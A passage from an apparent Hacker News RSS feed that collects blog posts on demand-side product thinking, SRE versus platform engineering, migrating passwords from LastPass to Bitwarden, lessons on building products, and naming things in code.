<p>An approach that has caught my attention is what I like to call Demand-side Thinking. It‚Äôs based on Bob Moesta‚Äôs work on<a href="https://amzn.to/3rWZDrk" target="_blank" rel="noopener"> Demand-side Sales</a>. In his book Moesta contrasts supply-side sales, a focus on products, features and benefits, with demand-side sale, which focuses on the buyer‚Äôs world view and what causes them to make a purchase. It flips the perspective by trying to understand the world from the buyer‚Äôs point of view.&nbsp; Instead of asking a supply-side question, how can I build and push a product to the customer, we ask a demand-side question: how can we build a product that the customer pulls into their world?&nbsp; It applies the <a href="https://www.christenseninstitute.org/jobs-to-be-done/" target="_blank" rel="noopener">‚Äújobs to be done‚Äù theory</a> to product development, positioning and sales.</p>



<p>Jobs to be done theory emphasizes that people don‚Äôt buy products, they hire them to make progress in their lives. Your product‚Äôs role is to move your customer from his or her current circumstances towards a new,&nbsp; improved state. This desire for progress and associated challenges create a struggling moment for the customer.</p>



<p>This struggling moment is the spark that inspires a question in the mind: ‚Äúis there a better way?‚Äù. This simple, yet powerful question pushes the customer to invest time in searching and learning about possible solutions.&nbsp; As the late Clay Christensen had said ‚Äúquestions are places in your mind where answers fit‚Äù. As a product developer the questions that arise from the customer struggles are opportunities for us to explore, define and develop the right solutions&nbsp; to help them make progress.</p>



<p>The customer is not looking for a long list of feature. A feature is no use to them if it doesn‚Äôt contribute meaningful towards making progress for them. That means, your really great AI feature, or that nifty UX concept is of no value if doesn‚Äôt resolve the customers struggles. On the other features that remove obstacles and move the customer forward towards their goals will be seen as delightful to use. This frame of thinking is complete customer centric. It will influence not just what you build, but also how you position it in the market. This is demand-side thinking.</p>



<p>It also changes how you interact with your customers to try and understand them. Customers usually have a hard time pin pointing the causes of their struggles. Consider the following example interaction from Moesta‚Äôs book:</p>



<p>‚ÄúI need a drill, because I want a hole.‚Äù</p>



<p>‚ÄúWhy?‚Äù</p>



<p>‚ÄúI need a hole, because I want a plug.‚Äù</p>



<p>‚ÄúWhy?‚Äù</p>



<p>‚ÄúI need a plug, because I want a lamp.‚Äù</p>



<p>‚ÄúWhy do you want a lamp?‚Äù</p>



<p>‚ÄúBecause it‚Äôs hard to see, and I want to read better.‚Äù</p>



<p>The job to be done in this example is to read better with a lamp, not drill a hole. Perhaps the solution that helps make progress here is a battery powered lamp. In that case neither a hole, nor a drill is required. Notice that uncovering this detail requires us to dig deep and ask several ‚Äúwhy‚Äù‚Äòs to get the bottom of things. Otherwise we will only hear the surface level need from the customer. This also illustrates why customers are often not the best people to look to for solutions. In many cases, they may not be diagnosing their problems clearly to begin with.</p>



<p>Demand-side approach gives us the tools to uncover the real need, the root cause and the actual demand from the customer.</p>



<p>While the struggling moment is the force that pushes the customer to start looking for improvements, there are three other forces at play that need to be considered:</p>



<ol><li>The magnetism of your offering: Does your product clearly resolve the customers struggling moment? This is a force that pulls the customer towards your product.</li><li>The anxiety of the new solution: Will your product fulfill and deliver on it‚Äôs promise? There is an anxiety that pushes a customer back to status quo.</li><li>The habit of the present: People become accustomed to their struggles. There is a learned helplessness that prevents them from making progress.</li></ol>



<p>These forces can be framed and tackled as a sales problem. For example money back guarantees, access to community can help with addressing anxiety of trying a new solution.&nbsp; Others can be baked into the product, for example a clean onboarding experience that smoothly transitions the customer from their old habits to a new one.</p>



<p>Demand-side thinking takes you from asking what do I want to build, to asking what is the market craving for. It is the ultimate ‚Äúblue ocean strategy‚Äù that can reveal untapped opportunities and create real pull for your products.</p>



<p><strong>Further Reading:</strong></p>



<p><a href="https://amzn.to/3rWZDrk" target="_blank" rel="noopener">Demand-Side Sales 101: Stop Selling and Help Your Customers Make Progress by Bob Moesta</a></p>



<p><a href="https://amzn.to/3beMX8r" target="_blank" rel="noopener">Competing Against Luck: The Story of Innovation and Customer Choice  by Clayton Christensen</a></p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- .hentry -->

<!-- #comments -->

		</main><!-- #main -->

		
<!-- #secondary -->
	</div><!-- .container -->


	</div></div>]]>
            </description>
            <link>https://makingsmallercircles.com/uncategorized/demand-side-thinking-creating-pull-for-your-products/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26174215</guid>
            <pubDate>Thu, 18 Feb 2021 01:14:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SRE vs. Platform Engineering]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26174094">thread link</a>) | @rdli
<br/>
February 17, 2021 | https://blog.getambassador.io/the-rise-of-cloud-native-engineering-organizations-1a244581bda5 | <a href="https://web.archive.org/web/*/https://blog.getambassador.io/the-rise-of-cloud-native-engineering-organizations-1a244581bda5">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><h2 id="ceaa">DevOps, GitOps, and the Rise of Cloud-Native Engineering Organizations</h2><div><div><div><p><a href="https://medium.com/@datawire?source=post_page-----1a244581bda5--------------------------------" rel="noopener"><img alt="Datawire" src="https://miro.medium.com/fit/c/96/96/0*5hfCO2OGW1F4dFam.png" width="48" height="48"></a></p></div></div></div></div><p id="c8c6">Over the past decade, engineering and technology organizations have converged on a common set of best practices for building and deploying cloud-native applications. These best practices include continuous delivery, containerization, and building observable systems.</p><p id="0456">At the same time, cloud-native organizations have radically changed how they‚Äôre organized, moving from large departments (development, QA, operations, release) to smaller, independent development teams. These application development teams are supported by two new functions: site reliability engineering and platform engineering. SRE and platform engineering are spiritual successor of traditional operations teams, and bring the discipline of software engineering to different aspects of operations.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/8640/1*TV-rJk9Vh8IulePV8JiZmw.png" width="4320" height="2208" srcset="https://miro.medium.com/max/552/1*TV-rJk9Vh8IulePV8JiZmw.png 276w, https://miro.medium.com/max/1104/1*TV-rJk9Vh8IulePV8JiZmw.png 552w, https://miro.medium.com/max/1280/1*TV-rJk9Vh8IulePV8JiZmw.png 640w, https://miro.medium.com/max/1400/1*TV-rJk9Vh8IulePV8JiZmw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*TV-rJk9Vh8IulePV8JiZmw.png?q=20"></p></div></div></div></figure><p id="4648">Platform engineering teams apply software engineering principles to <strong>accelerate software delivery</strong>. Platform engineers ensure application development teams are productive in all aspects of the software delivery lifecycle.</p><p id="e6b2">Site reliability engineering teams apply software engineering principles to <strong>improve reliability</strong>. Site reliability engineers minimize the frequency and impact of failures that can impact the overall reliability of a cloud application.</p><p id="0360">These two teams are frequently confused and the terms are sometimes used interchangeably. Indeed, some organizations consolidate SRE and platform engineering into the same function. This occurs because both roles apply a common set of principles:</p><ul><li id="a8ec">Platform as product. These teams should spend time understanding their internal customers, building roadmaps, having a planned release cadence, writing documentation, and doing all the things that go into a software product.</li><li id="5c9d">Self-service platforms. These teams build their platforms for internal use. In these platforms, best practices are encoded, so that the users of these platforms don‚Äôt need to worry about it ‚Äî they just push the button. In the <a href="https://puppet.com/resources/report/2020-state-of-devops-report/" rel="noopener">Puppet Labs 2020 State of DevOps report</a>, Puppet Labs found that High functioning DevOps organizations had more self-service infrastructure than low DevOps evolution organizations.</li><li id="84ae">A constant focus on <a href="https://sre.google/sre-book/eliminating-toil/" rel="noopener">eliminating toil</a>. As defined in the Google SRE book, toil is manual, repetitive, automatable, tactical work. The best SRE and platform teams identify toil, and work to eliminate it.</li></ul><p id="e1f2">Platform engineers constantly examine the entire software development lifecycle from source to production. From this introspective process, they build a workflow that enables application developers to rapidly code and ship software. A basic workflow typically includes a source control system connected with a continuous integration system, along with a way to deploy artifacts into production.</p><p id="a167">As the number of application developers using the workflow grows, the needs of the platform evolves. Different teams of application developers need similar but different workflows, so self-service infrastructure becomes important. Common platform engineering targets for self-service include CI/CD, alerting, and deployment workflows.</p><p id="9487">In addition to self-service, education and collaboration become challenges. Platform engineers find they increasingly spend time educating application developers on best practices and how to best use the platform. Application developers also find that they depend on other teams of application developers, and look to the platform engineering team to give them the tools to collaborate productively with different teams.</p><p id="c748">Site reliability engineers create and evolve systems to automatically run applications, reliably. The concept of site reliability engineering originated at Google, and is documented in detail in the <a href="https://sre.google/sre-book/introduction/" rel="noopener">Google SRE Book</a>. Ben Treynor Sloss, the SVP at Google responsible for technical operations, described SRE as ‚Äúwhat happens when you ask a software engineer to design an operations team.‚Äù</p><p id="8382">SREs define service level objectives and build systems to help services achieve these objectives. These systems evolve into a platform and workflow that encompass monitoring, incident management, eliminating single points of failure, failure mitigation, and more.</p><p id="5e14">A key part of SRE culture is to treat every failure as a failure in the reliability system. Rigorous post-mortems are critical to identifying the root cause of the failure, and corrective actions are introduced into the automatic system to continue to improve reliability.</p><p id="4756">One of us (Bjorn Freeman-Benson) managed the engineering organization at New Relic until 2015 as it grew from a handful of customers to tens of thousands of customers, all sending millions of requests per second into the cloud. New Relic had independent SRE and platform engineering teams that followed the general principles outlined above.</p><p id="ab4a">One of the reasons these teams were built separately was that the people who thrived in these roles differed. While both SREs and platform engineers need strong systems engineering skills in addition to classic programming skills, the roles dictate very different personality types. SREs tend to enjoy crisis management and get an adrenaline rush out of troubleshooting an outage. SRE managers thrive under intense pressure and are good at recruiting and managing similarly minded folks. On the other hand, platform engineers are more typical software engineers, preferring to work without interruption on big, complex problems. Platform engineering managers prefer to operate on a consistent cadence.</p><p id="f0f8">Over the past decade, DevOps has become a popular term to describe many of these practices. More recently, GitOps has also emerged as a popular term. How do DevOps and GitOps relate to platform and SRE teams?</p><p id="e90a">Both DevOps and GitOps are a loosely codified set of principles of how to manage different aspects of infrastructure. The core principles of both of these philosophies ‚Äî automation, infrastructure as code, application of software engineering ‚Äî are very similar.</p><p id="5ed9">DevOps is a broad movement that began with a focus on eliminating traditional silos between development and operation. Over time, strategies such as infrastructure automation and engineering applications with operations in mind have gained widespread acceptance as ways better build highly reliable applications.</p><p id="9db4">GitOps is an approach for application delivery. In GitOps, declarative configuration is used to codify the desired state of the application at any moment in time. This configuration is managed in a versioned source control system as the single source of truth. This ensures auditability, reproducibility, and consistency of configuration.</p><blockquote><p id="ccd3">In short: DevOps is a set of guiding principles for SRE, while GitOps is a set of guiding principles for platform engineering.</p></blockquote><p id="62fd"><a href="https://ctt.ac/Dbfff" rel="noopener">Tweet this.</a></p><p id="4a1d">Site reliability engineering and platform engineering are two functions that are critical to optimizing engineering organizations for building cloud-native applications. The SRE team works to deliver infrastructure for highly reliable applications, while the platform engineering team works to deliver infrastructure for rapid application development. Together, these two teams unlock the productivity of application development teams.</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.getambassador.io/the-rise-of-cloud-native-engineering-organizations-1a244581bda5</link>
            <guid isPermaLink="false">hacker-news-small-sites-26174094</guid>
            <pubDate>Thu, 18 Feb 2021 00:59:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to move from LastPass to Bitwarden in ten minutes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26174053">thread link</a>) | @jdauriemma
<br/>
February 17, 2021 | https://jdauriemma.com/misc/lastpass-to-bitwarden | <a href="https://web.archive.org/web/*/https://jdauriemma.com/misc/lastpass-to-bitwarden">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="main-content">
        <div>
          <article itemscope="" itemtype="http://schema.org/BlogPosting">
  
  <div itemprop="articleBody">
    <p>LastPass recently notified users that their free product will drastically
change on 2021-03-16 in
<a href="https://blog.lastpass.com/2021/02/changes-to-lastpass-free/">a recent blog post</a>.
I believe
this change is being made irresponsibly,
but you can read my opinion in a follow-up post I'm planning.
Many non-paying users are looking around
for alternatives.  <a href="https://bitwarden.com/">Bitwarden</a> fits the bill nicely
for me: it has desktop, mobile, and web apps with the same features as LastPass,
plus it has the benefit of being largely
<a href="https://github.com/bitwarden">open-source software</a>
distributed under GPL/AGPL licenses.</p>

<p>Bitwarden's help docs have a decent
<a href="https://bitwarden.com/help/article/import-from-lastpass/">guide to help users import data from LastPass</a>
but if you need some additional resources, please read on.</p>

<h2 id="export-your-lastpass-data">Export your LastPass data</h2>

<p>Before we get started, be aware that you will be downloading a file containing
all the username/password combinations you have stored in LastPass.  This
file will not be encrypted - the passwords will be in plain text.
Once you're done copying your data into Bitwarden, delete all the data you
downloaded from LastPass so that it is no longer available on your computer.</p>

<ol>
<li>On a desktop or laptop, log into LastPass.</li>
<li>Open the navigation panel on the left side of the screen.</li>
<li>Tap <strong>Advanced Options</strong>.  A new menu will appear to the right.</li>
<li>Tap <strong>Export</strong>.  You will be prompted to enter your master password.</li>
<li>The screen may appear unresponsive for a short time.  That is normal.</li>
</ol>

<figure>
  <div>
    <section>
      <img loading="lazy" decoding="async" alt="LastPass interface showing the left navigation bar open and 'Advanced Options' highlighted" src="https://jdauriemma.com/assets/images/posts/lastpass-to-bitwarden/desktop-1.png">
    </section>
    <section>
      <img loading="lazy" decoding="async" alt="LastPass interface showing the left navigation bar open and 'Export' highlighted" src="https://jdauriemma.com/assets/images/posts/lastpass-to-bitwarden/desktop-2.png">
    </section>
  </div>
  <figcaption>
    <span>
      Use the left navigation to drill down: <strong>Advanced Options</strong> üëâ <strong>Export</strong>
    </span>
  </figcaption>
</figure>

<ol start="6">
<li>The browser window will turn white and black text will appear.  This text contains all the usernames, passwords, etc. you store in LastPass.</li>
<li>Leave this window open for a moment.</li>
<li>Open a plain text editor.  If you're not sure what a plain text editor is,
don't worry.  You have one installed on your operating system.
<a href="https://www.fedoraoutlier.com/the-built-in-text-editors-on-windows-and-macs/">See this link</a>
for more information.</li>
<li>Highlight and copy all the text from the open LastPass window.  Paste
it into your text editor.</li>
<li>Save the file as <code>export.csv</code>.</li>
</ol>

<p>To avoid inadvertently pasting this sensitive information somewhere
else, copy some other text as a safeguard.</p>

<h2 id="sign-up-for-bitwarden">Sign up for Bitwarden</h2>

<p>Go to <a href="https://bitwarden.com/">bitwarden.com</a>.  Tap "Get Started" in the top
right corner.  You will be prompted to enter your email address and to set
a master password, much like LastPass.  I recommend using a password that
is different from your LastPass master password.</p>

<p>Once you have completed registration and confirmed your email address,
log into Bitwarden again.</p>

<ol>
<li>Tap <strong>Tools</strong> at the top of the window.</li>
<li>On the left, tap <strong>Import Data</strong>.</li>
<li>Under <strong>1. Select the format of the import file</strong>, select
"LastPass (csv)."</li>
<li>Under <strong>2. Select the import file</strong>, select the <code>export.csv</code> file you created earlier.  Tap the button labeled <strong>Import Data</strong>.</li>
</ol>

<figure>
  <div>
    <section>
      <img loading="lazy" decoding="async" alt="Text editor showing a file called 'export.csv' with data" src="https://jdauriemma.com/assets/images/posts/lastpass-to-bitwarden/desktop-3.png">
    </section>
    <section>
      <img loading="lazy" decoding="async" alt="Bitwarden interface showing the 'Tools' section open and 'Import Data' highlighted" src="https://jdauriemma.com/assets/images/posts/lastpass-to-bitwarden/desktop-4.png">
    </section>
  </div>
  <figcaption>
    <span>
      Copy the LastPass export into <code>exports.csv</code> using a plain text editor like Notepad, TextEdit, or Vim.  Tap <strong>Tools</strong> üëâ  <strong>Import Data</strong> and upload <code>exports.csv</code>.
    </span>
  </figcaption>
</figure>

<p>Your data should now be available.  According to Bitwarden's documentation,
some users have experienced issues with the encoding of certain special
characters in passwords:</p>

<blockquote>
<p>Warning</p>

<p>Some users have reported a bug which changes special characters in your passwords (&amp;, &lt;, &gt;, etc.) to their HTML-encoded values (for example, <code>&amp;amp;</code> in the printed export.</p>

<p>If you observe this bug in your exported data, use a text editor to find and replace all altered values before importing into Bitwarden.</p>
</blockquote>

<p>I haven't come across anything like that yet, but I transitioned very recently.
I will update this post if I come across anything unusual.</p>

<h2 id="ios-users-update-autofill">iOS users: update AutoFill</h2>

<p>If you're not an iOS user, <a href="#delete-your-lastpass">skip this section</a>.</p>

<p>As an iOS user, I am accustomed to using LastPass to autofill passwords.
After installing the
<a href="https://apps.apple.com/us/app/bitwarden-password-manager/id1137397744">Bitwarden app</a>:</p>

<ol>
<li>Go into <strong>Settings</strong>.</li>
<li>Tap on <strong>Passwords</strong>.</li>
<li>Tap on <strong>AutoFill Passwords</strong>.</li>
<li>Tap on <strong>Bitwarden</strong>.</li>
<li>Follow the prompts.</li>
</ol>

<figure>
  <div>
    <section>
      <img loading="lazy" decoding="async" alt="iOS Settings menu with 'Passwords' highlighted" src="https://jdauriemma.com/assets/images/posts/lastpass-to-bitwarden/ios-1.jpg">
    </section>
    <section>
      <img loading="lazy" decoding="async" alt="iOS Passwords menu" src="https://jdauriemma.com/assets/images/posts/lastpass-to-bitwarden/ios-2.jpg">
    </section>
    <section>
      <img loading="lazy" decoding="async" alt="iOS AutoFill Passwords menu with Bitwarden selected" src="https://jdauriemma.com/assets/images/posts/lastpass-to-bitwarden/ios-3.jpg">
    </section>
  </div>
  <figcaption>
    <span>
      <strong>Settings</strong> üëâ
      <strong>Passwords</strong> üëâ
      <strong>Autofill Passwords</strong> üëâ
      <strong>Bitwarden</strong>
    </span>
  </figcaption>
</figure>



<h2 id="delete-your-lastpass-after-a-while">Delete your LastPass (after a while)</h2>

<p>It's a good idea to hold onto your LastPass free account for a short time,
at least until you are reasonably certain Bitwarden is meeting your needs and
that all of your data was copied over successfully.  I haven't done this part
yet, but
<a href="https://lastpass.com/delete_account.php">the documentation</a>
makes it seem pretty simple.</p>

    
    <h3>Keep the conversation going</h3>
    <p>I really appreciate feedback from anyone and everyone who reads my posts, so please feel free to say hi at <a href="https://mastodon.social/@bignimbus" target="_blank"><span data-cfemail="7a18131d141317180f093a171b090e151e151454091519131b16">[email&nbsp;protected]</span></a> and keep the conversation going.</p>
    
  </div>
  
</article>


        </div>
      </section></div>]]>
            </description>
            <link>https://jdauriemma.com/misc/lastpass-to-bitwarden</link>
            <guid isPermaLink="false">hacker-news-small-sites-26174053</guid>
            <pubDate>Thu, 18 Feb 2021 00:55:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building products ‚Äì Things I wish I knew when I started building products]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26173963">thread link</a>) | @gmays
<br/>
February 17, 2021 | https://amiltonpaglia.com/writing/building-products | <a href="https://web.archive.org/web/*/https://amiltonpaglia.com/writing/building-products">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><main><header></header><div><p>Nov 7, 2020, 21:00<!-- --> <svg width="16" height="16" style="position:relative;top:2px"><line x1="4" y1="16" x2="12" y2="2" style="stroke:#ccc"></line></svg> <time datetime="1604782800000">3 months ago</time></p></div><p>It's not a step by step guide but rather an attempt to synthesize my thinking about what it really matters to build great products.</p><p>I've been building products for the last 12 years. On this journey, I have been fortunate to have the opportunity to wear a lot of different hats in the making of a digital product.&nbsp;</p><p>I've worked as Interface designer, Front-end developer, UX Designer, Product Designer and lastly, as a Product Manager. All along the way, I've always had a close relationship with engineers, learning everything I could about development and understanding all the effort and creativity necessary to bring products to life.</p><p>To keep this valuable for a wider audience and range of professionals, I've tried to extract the essence of I believe to be essential to keep in mind when building products.</p><p>Loading...</p><h2>Purpose</h2><p><strong>Everything starts with a clear purpose.</strong></p><p>When building products, you have to be an<!-- --> <strong>eternal optimist about your mission‚Ää</strong> ‚Äì ‚Ääto help you get through the rough times, and<!-- --> <strong>very pessimist about execution‚Ää</strong> ‚Äì ‚Ääit always takes way more time and effort to nail it.</p><p><strong>Build great products takes time; it's a long-term commitment.</strong> <!-- -->It's almost impossible (in my experience) to immerse yourself in a work whose purpose isn't aligned with your beliefs.</p><p>Without a clear purpose for you (and your team), it's tough to find an intrinsic motivation to keep iterating your product on a problem space.</p><p>Loading...</p><h2>Constraints</h2><blockquote>"...Here is one of the few effective keys to the Design problem: the ability of the Designer to recognize as many of the constraints as possible; his willingness and enthusiasm for working within these constraints. Constraints of price, of size, of strength, of balance, of surface, of time, and so forth. Each problem has its own peculiar list."<p>Charles &amp; Ray Eames</p></blockquote><p>I love this excerpt from an<!-- --> <a href="https://www.hermanmiller.com/stories/why-magazine/design-q-and-a-charles-and-ray-eames/">interview with Charles and Ray Eames</a> <!-- -->in 1972 about Design. This quote stayed on my mind since the first time I've read it.</p><p><strong>Embracing constraints is essential to creativity.</strong> The primary fuel to your problem-solving is to identify what restrictions you're dealing with.</p><p>Your purpose is what drives your "willingness and enthusiasm for working within these constraints." Once you have a clear purpose and goal in mind, you have to "identify as many constraints as possible" to have a clear problem space to tackle, and sometimes you need to enforce additional constraints.</p><p>I like to think about constraints in two spectrums:</p><ul><li>From <strong>hard constraints</strong> to<!-- --> <strong>self-imposed constraints</strong>;</li><li>From <strong>under constraint</strong> to<!-- --> <strong>over constraint</strong>;</li></ul><h3>Hard &amp; Self-imposed constraints</h3><p><strong>Hard constraints</strong> are the ones that you have little to no influence under it. It's time, resources, team, skills, funding, knowledge, market conditions, laws, available technology, and so on. It's the constraints that you'll have to work within, no matter what.</p><p><strong>Self-imposed constraints</strong> are the ones you set to have a clear problem space and increase your focus. It could come in different shapes. It could be your values, product principles, strategy, and everything else you and your team agree on that helps you stay on the right path. It's your conscious trade-offs.</p><h3>Under &amp; Over Constraints</h3><p><strong>An under constrained problem space will be too broad and challenging to narrow down what really matters.</strong> <!-- -->You'll see yourself drowned in the endless possibilities to solve problems. When you find yourself in this scenario, it's better to enforce new constraints and make trade-offs to eliminate noise.</p><p>On the other hand,<!-- --> <strong>when you over constrain it, you won't leave room for improvisation, innovation, and adaption when it's needed.</strong> <!-- -->You have to find a sweet spot on this spectrum to have the freedom to experiment.</p><p><strong>Identifying the right constraints and balancing them is an ongoing challenge.</strong> <!-- -->Your team will grow, new technologies will enable new solutions, markets, and users will continuously evolve.</p><p>You have to keep your eyes open to see what stays true and what helps you stay focused on what matters.<!-- --> </p><p>Loading...</p><h3>Shaping friction</h3><p><strong>Your goal when designing a product is to shape friction.</strong> <!-- -->You'll have to shape as many frictions as possible from your user's journey to achieve the desired outcome. Here are some examples:</p><ul><li><strong>Optimize your user acquisition‚Ää</strong> ‚Äì remove friction from each step of the funnel;</li><li><strong>Improve engagement‚Ää</strong> ‚Äì remove friction to make core actions more intuitive and accessible;</li><li><strong>Reduce churn‚Ää</strong> ‚Äì ‚Ääremove friction that is keeping users away from their goals;</li><li><strong>Avoid unintended behaviors‚Ää</strong> ‚Äì‚Ää Instagram adding features to avoid users (adding friction) to pos offensive content;</li><li>You got the point‚Ä¶</li></ul><p><mark><strong>To identify which friction worth solving/shaping, you have to have a deep understating of your product and the people using it.</strong></mark> <!-- -->You'll have to know product goals and the user's job-to-be-done (context, objectives, functional and emotional needs).</p><p>In essence, your job is to continuously iterate, shape, and balance the right amount of friction on each part of the product.</p><h3>Prioritization &amp;&nbsp;Judgment</h3><p>Loading...</p><p><strong><mark>Prioritization is one of the most essential subjects in building products.</mark></strong></p><p>There are endless techniques, frameworks, mental models, and tools to help you make the right decisions when prioritizing your next move.</p><p>The truth is that it's tough to make the "best" decisions, even when you have lots of qualitative and quantitative insights (not the case for early-stage products) to inform your prioritization.</p><p><strong>Confident decision making takes time</strong>. When working on a high-growth startup, you'll have to be comfortable with the uncertainty, lack of time, data, and resources to make the right call.</p><p>Another critical factor to keep in mind is your (and your team's) biases. Even when you have plenty of data at your disposal, you and your team are always influenced by some bias (<a href="https://en.wikipedia.org/wiki/List_of_cognitive_biases" title="Cognitive biases" target="_blank">confirmation bias and others</a>).</p><p>There will be times when you won't have enough data, other times you won't have enough time, and most of the time, you won't be aware of your biases.</p><p>That leads me to my last point, <strong>judgment</strong>. Good judgment is extremely underrated these days, but I find it one of the most valuable traits.</p><blockquote>"Good Judgment depends mostly on experience, and experience usually comes from poor judgment."<p>Old saying</p></blockquote><p>Good judgment is also impossible to measure upfront, but<!-- --> <strong>it will be your judgment</strong> to assess the risk and time needed to make each decision<strong>that will lead you towards the best possible outcomes</strong> <!-- -->in times of uncertainty.</p></main></div></div></div>]]>
            </description>
            <link>https://amiltonpaglia.com/writing/building-products</link>
            <guid isPermaLink="false">hacker-news-small-sites-26173963</guid>
            <pubDate>Thu, 18 Feb 2021 00:44:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Is Naming Things Hard?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26173903">thread link</a>) | @r_singh
<br/>
February 17, 2021 | https://neilkakkar.com/why-is-naming-things-hard.html | <a href="https://web.archive.org/web/*/https://neilkakkar.com/why-is-naming-things-hard.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>An interesting shift happens once you realise you‚Äôre writing code for humans to read, and not just for machines to execute.</p>

<p>One big change is that writing clearly takes priority over correct code.<sup id="fnref:1"><a href="#fn:1">1</a></sup></p>

<p>Reading code involves building up a mental model of what each thing should do, and how these things interact with each other. The best code, however, short-circuits reading everything. Instead of reading the implementation, you use variable and function names, comments, and other clues to figure things out.<sup id="fnref:3"><a href="#fn:3">2</a></sup></p>

<p>This is chunking. You combine things together, and remember them together. For example, a Chess Opening, like the Queen‚Äôs Gambit, is a chunk. So is a <code>forEach</code> loop: just by the name, you can figure out that it‚Äôs going to do something to every element of an array.</p>

<p>Once you‚Äôve built a chunk for a <code>forEach</code> loop, you don‚Äôt have to read the implementation of <code>forEach</code> to understand what it will do. This is very powerful, since it allows you to come back to the code, without having to read the implementation of everything again.</p>

<p>Thus, a good name is a chunk that encodes important information about what the thing does.</p>

<p>We‚Äôre compressing information into the name. This is almost always a lossy compression. Further, the more lines to compress, the more losses you incur, since you want your names to be no longer than 80 characters.</p>

<p>The goal of good naming is to minimize this loss.</p>

<p>And naming things is hard because of this compression. English isn‚Äôt precise like C++, so compressing from a precise to an ambiguous language increases losses. Another big reason is that choosing the most important things to include is hard. You‚Äôll notice that most disagreements about naming fall on these two axes: either the name isn‚Äôt just right for what you want to do (does it <code>assign</code> or <code>setup</code> or <code>link</code> or <code>mangle</code>?). Or the name doesn‚Äôt capture important parts of the functionality.</p>

<p>I think this is the generating function for most best practices I‚Äôve heard of, and thus lots more valuable than one specific guidance.</p>

<h2 id="generating-best-practices">Generating best practices</h2>

<!-- Keep names short: big chunks are difficult chunks -->

<ol>
  <li>
    <p>Make functions do one thing</p>

    <p>When a function does multiple things, the name needs to encode lots more information, like <code>link_user_to_trial_and_enable_downloads_and_set_charge_date()</code>. That‚Äôs a long name, and a sign of losing too much information: what semantics should the name expose about the charge date, and enabling downloads?</p>

    <p>These side effects are hard to encode for in the name.</p>
  </li>
  <li>
    <p>Keep functions small</p>

    <p>Long functions, like functions doing lots of things, need to encode lots of information into the name. And since the name length is bounded, you lose a lot more information in compressing this long name, which leads to poorer names.</p>
  </li>
  <li>
    <p>Avoid meaningless names</p>

    <p>Since we‚Äôre writing code to be read by humans, names that don‚Äôt compress any information don‚Äôt help us build chunks. This makes it harder to read, since you have to go down one layer of abstraction. You need to parse the implementation to understand what that piece of code does.</p>
  </li>
  <li>
    <p>Avoid too abstract names</p>

    <p><code>do_things()</code> is a suitable name for any function, but the compression is too lossy to be useful - you lose almost all information, and need to parse the body to figure out what it does. Not great. It‚Äôs almost a meaningless name.</p>
  </li>
  <li>
    <p>Be consistent</p>

    <p>When you build similar chunks throughout your code base, it becomes easier to go up another layer of abstraction, by chunking the chunks. For example, continuing the trial management system example, you‚Äôll have 3 things in place:</p>

    <ol>
      <li><code>link_user_to_trial_agreement_given_email()</code></li>
      <li><code>enable_research_downloads_for_user()</code></li>
      <li><code>set_charge_date_for_user()</code></li>
    </ol>

    <p><br>
 Since they‚Äôre operating in the same domain, you can go up one level to <code>setup_user_for_trial()</code> that does all three.</p>
  </li>
</ol>

<h2 id="disrupting-best-practices">Disrupting best practices</h2>

<p>The generator of best practices allows you to reason about cases where best practices aren‚Äôt the best way forward.</p>

<p>For example, consider being consistent, and naming variables using camelCase. Your entire codebase uses camelCase. You‚Äôre writing a new function that‚Äôs very non-standard. It does arcane stuff that doesn‚Äôt fit into your existing model. You need it, because legacy integration/business requirements/etc. In effect, you don‚Äôt want anyone to gloss over it when they read it.</p>

<p>So, do you stay consistent, and keep it in camelCase? Or, do you switch to snake_case?</p>

<p>The goal is to keep things clear. I would switch to snake_case to show how it‚Äôs different from the rest, and have some comments explaining the arcane things it does.<sup id="fnref:2"><a href="#fn:2">3</a></sup></p>

<h2 id="precision-with-words">Precision with words</h2>

<p>Spoken languages are very imprecise. There‚Äôs lots of ambiguity, double meanings, and sentences that don‚Äôt mean anything.</p>

<p>Code, however, needs to be precise. Like we saw above, this is a source of trouble, since we‚Äôre trying to compress a precise language into an imprecise one, which makes searching for the right English words harder.</p>

<p>These ideas apply to naming things outside of code, too! When you have a name for something, it suddenly becomes legible.</p>

<p>Consider: You see some people around you who test if they can do something once, and drop it if they fail. Some others keep trying until they learn how to do it. The first group prizes its intelligence, while the second group prizes its hard work. Then, when you hear about the <a href="https://neilkakkar.com/story-of-stories.html#the-story-of-growth-vs-fixed-mindset">Fixed vs Growth mindset</a>, things immediately click.</p>

<p>Choosing the right name here is hard too. Every best practice that lost its nuance over time can be attributed to a name that didn‚Äôt encode the necessary information. People passed these ideas on without explaining the nuances.</p>

<p>Or, consider equating two names. ‚ÄúAbortion is murder‚Äù - equating two names that aren‚Äôt the same creates an interesting dynamic between emotions and the truth. Each name has different connotations, and on combining them together, you‚Äôre passing on the connotations of one onto the other. This isn‚Äôt necessarily a good thing. You have to be very careful of the equality operator in an imprecise language.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Optimise for clear, easy to understand code. The cost of reading it is higher than the cost of executing it.</p>

<p>To do this, leverage chunking: write names that are meaningful, and encode as much information as possible into the name.</p>

